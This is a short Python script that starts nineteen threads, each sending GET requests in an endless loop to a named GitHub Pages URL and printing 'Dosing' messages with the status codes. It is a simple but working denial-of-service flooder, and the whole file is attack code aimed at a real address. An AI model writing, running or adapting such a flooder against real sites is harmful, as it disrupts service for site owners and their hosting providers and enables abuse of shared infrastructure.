import requests
import threading
def make_request(name):
    while(True):
        t=requests.get("https://santhoshsivam.github.io/CV")
        print("Dosing.......,Requests are sent by #{} and it returns {} ".format(name,str(t.status_code)))


threads=18
i=0
while(i<=threads):
    p=threading.Thread(target=make_request,args=(i,))
    p.start()
    i+=1
    print("Starting the thread# {}".format(i))
